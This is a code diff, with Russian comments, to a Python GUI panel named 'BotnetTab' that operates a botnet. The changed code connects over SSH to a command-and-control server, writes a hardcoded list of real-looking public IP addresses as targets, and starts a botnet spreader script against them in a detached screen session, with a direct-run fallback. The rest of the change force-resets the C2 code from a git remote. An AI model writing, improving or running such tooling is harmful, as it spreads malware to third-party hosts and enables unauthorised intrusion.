@@ -444,12 +444,25 @@ class BotnetTab(ttk.Frame):
                 client = paramiko.SSHClient()
                 client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                 client.connect(self.c2_host, username=self.vps_user, password=self.vps_pass, timeout=5)
-                # Передаём вшитый список IP через временный файл
-                cmd = "cd /root/c2 && python3 -c \"import json; ips = ['45.33.32.156','34.94.3.0','45.77.165.0','185.220.101.0','23.226.229.0','103.15.28.0','185.225.19.0','45.33.32.0','45.56.89.0','45.79.207.0','34.94.0.0','34.94.1.0','45.33.32.1','34.94.2.0','45.77.165.1','103.235.46.39','103.235.46.40','103.235.46.41','103.235.46.42','103.235.46.43','103.235.46.44','103.235.46.45','103.235.46.46','103.235.46.47','103.235.46.48','103.235.46.49','103.235.46.50']; open('masscan.json','w').write(json.dumps(ips))\" && python3 -u botnet/spreader.py --targets masscan.json"
+                # Создаём список IP и запускаем спредер в screen, чтобы логи были видны
+                cmd = ("cd /root/c2 && "
+                       "python3 -c \"import json; ips = ['45.33.32.156','34.94.3.0','45.77.165.0','185.220.101.0','23.226.229.0','103.15.28.0','185.225.19.0','45.33.32.0','45.56.89.0','45.79.207.0','34.94.0.0','34.94.1.0','45.33.32.1','34.94.2.0','45.77.165.1','103.235.46.39','103.235.46.40','103.235.46.41','103.235.46.42','103.235.46.43','103.235.46.44','103.235.46.45','103.235.46.46','103.235.46.47','103.235.46.48','103.235.46.49','103.235.46.50']; open('masscan.json','w').write(json.dumps(ips))\" && "
+                       "screen -dmS mass_spreader python3 -u botnet/spreader.py --targets masscan.json 2>&1")
                 stdin, stdout, stderr = client.exec_command(cmd)
-                for line in iter(stdout.readline, ""):
-                    self.spread_log.insert(tk.END, line)
-                    self.spread_log.see(tk.END)
+                time.sleep(2)
+                # Проверяем, что screen создался
+                check = "screen -ls | grep mass_spreader"
+                stdin, stdout, stderr = client.exec_command(check)
+                if "mass_spreader" in stdout.read().decode():
+                    self.spread_log.insert(tk.END, "[+] Спредер запущен в screen mass_spreader\n")
+                else:
+                    self.spread_log.insert(tk.END, "[!] Не удалось запустить screen, пробуем напрямую...\n")
+                    # Пробуем без screen
+                    cmd2 = ("cd /root/c2 && python3 -u botnet/spreader.py --targets masscan.json")
+                    stdin, stdout, stderr = client.exec_command(cmd2)
+                    for line in iter(stdout.readline, ""):
+                        self.spread_log.insert(tk.END, line)
+                        self.spread_log.see(tk.END)
                 client.close()
             except Exception as e:
                 self.spread_log.insert(tk.END, f"[!] Ошибка: {e}\n")
@@ -472,7 +485,8 @@ class BotnetTab(ttk.Frame):
                 stop_cmd = "screen -ls | grep -E 'c2|spreader' | awk -F. '{print $1}' | xargs -I {} screen -S {} -X quit 2>/dev/null; pkill -9 -f botnet/c2.py; pkill -9 -f botnet/spreader.py"
                 client.exec_command(stop_cmd)
 
-                update_cmd = "cd /root/c2 && git pull origin main"
+                # Принудительно сбрасываем локальные изменения и подтягиваем свежее
+                update_cmd = "cd /root/c2 && git fetch origin main && git reset --hard origin/main"
                 stdin, stdout, stderr = client.exec_command(update_cmd)
                 out = stdout.read().decode()
                 err = stderr.read().decode()
